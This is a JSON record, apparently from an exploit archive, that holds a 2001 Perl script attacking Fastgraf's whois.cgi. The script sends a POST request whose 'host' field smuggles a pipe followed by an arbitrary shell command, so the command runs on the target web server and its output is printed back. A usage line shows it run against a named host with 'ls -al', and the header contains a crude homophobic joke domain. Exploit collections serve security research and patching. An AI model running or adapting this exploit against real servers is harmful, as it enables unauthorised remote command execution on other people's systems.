{
  "id": "242",
  "title": "Fastgraf&#039;s whois.cgi - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n###############################################################\r\n# whois.pl - Marco van Berkum - m.v.berkum@obit.nl            #\r\n# homepage: http://ws.obit.nl - exploits Fastgraf's whois.cgi #                           \r\n#                                                             #\r\n# DO NOT EDIT THIS HEADER, else the bedbugs will bite         #\r\n# Greets to sigmo for finding stupid POST examples            #\r\n# Also greetings to DUCKEL (YES YOU HAVE CREDIT NOW ;))       #\r\n#                                                             #\r\n# Use like this:                                              #\r\n# ./whois.pl www.ifyoureadthisyouaregay.com \"ls -al\"          #\r\n###############################################################\r\n\r\nuse IO::Socket;\r\n$host = $ARGV[0]; $command = $ARGV[1]; $length = length($command) + 8;\r\n\r\n$sock = new IO::Socket::INET (PeerAddr => $host, PeerPort => 80, Proto    => 'tcp');\r\nif($sock) {\r\nprint $sock \"POST http://$host/cgi-bin/whois.cgi HTTP/1.0\r\nUser-Agent: Whois Meta Character Exploit Browser :P\r\nHost: $host\r\nContent-length: $length\r\n\r\nhost=%7c$command\\n\\n\";\r\nsleep(3); # change to lower or higher, depending on your connection \r\nsysread($sock, $buffer, 100000);\r\n        ($empty, $output) = split(/PRE/, $buffer);\r\n        $output =~ s/[\\<\\>\\/]//g;\r\n        if($output) {\r\n        print(\"$output\\n\");\r\n       } else { print \"No data, or not vulnerable\\n\";\r\n     }\r\n    } \r\nclose $sock;\r\n\r\n\r\n# milw0rm.com [2001-01-12]",
  "url": "https://www.exploit-db.com/exploits/242"
}